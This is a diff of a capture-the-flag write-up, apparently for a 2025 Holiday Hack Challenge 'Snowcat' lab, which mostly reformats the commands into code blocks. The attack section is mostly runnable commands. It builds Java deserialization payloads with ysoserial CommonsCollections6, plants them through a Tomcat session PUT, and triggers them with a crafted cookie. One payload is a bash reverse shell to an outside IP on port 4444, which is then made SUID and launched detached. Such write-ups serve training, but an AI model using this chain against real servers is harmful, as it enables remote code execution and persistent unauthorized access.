@@ -18,12 +18,15 @@ Using an account with minimal access to the system, the website was found to be 
 ## Detailed Solution
 <details>
 <summary>Click to expand</summary>
-Using a nonexistent URL, an error message was triggered revealing that the system is vulnerable. [Non Existant URL](https://localhostnonexistant)  
+Using a nonexistent URL, an error message was triggered revealing that the system is vulnerable.
+  
+[Non Existant URL](https://localhostnonexistant)
+  
 ![Tomcat Version Evidence](https://mitchdarrow.github.io/HHC_2025_Template/images/snowcat_version.jpg) 
 
 Testing began with the CommonsCollections6 gadget to determine if a payload could effectively be delivered. The initial approach is to simply touch a file in the /tmp directory.
 Payload details:
-```
+```sh
 java -jar /home/user/ysoserial.jar CommonsCollections6 'touch /tmp/pwned' > payload.bin
 SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
 curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
@@ -41,12 +44,12 @@ To achieve a remote shell, the following approach was used:
 5. Send a payload that uses setsid to detach the process completely and run the shell
 
 The shell file used was:
----
+```sh
 bash -i >& /dev/tcp/69.164.211.205/4444 0>&1
----
+```
 
 The payload used to set the SUID was:
----
+```sh
 java -jar /home/user/ysoserial.jar CommonsCollections6 'chmod u+s /tmp/reverse_shell.sh' > payload.bin
 <!-- Get session ID -->
 SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
@@ -54,10 +57,10 @@ SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}'
 curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
 <!-- Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
----
+```
 
 The payload used setid and ran the shell was:
----
+```sh
 java -jar /home/user/ysoserial.jar CommonsCollections6 'setsid bash /tmp/reverse_shell.sh >/dev/null 2>&1 &' > payload.bin
 <!-- Get session ID -->
 SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
@@ -65,7 +68,7 @@ SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}'
 curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
 <!-- Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
----
+```
 
 This resulted in access as the identity running the web service:
 ![Snowcat Service Account User](https://mitchdarrow.github.io/HHC_2025_Template/images/snowcat_serviceaccount.jpg) 
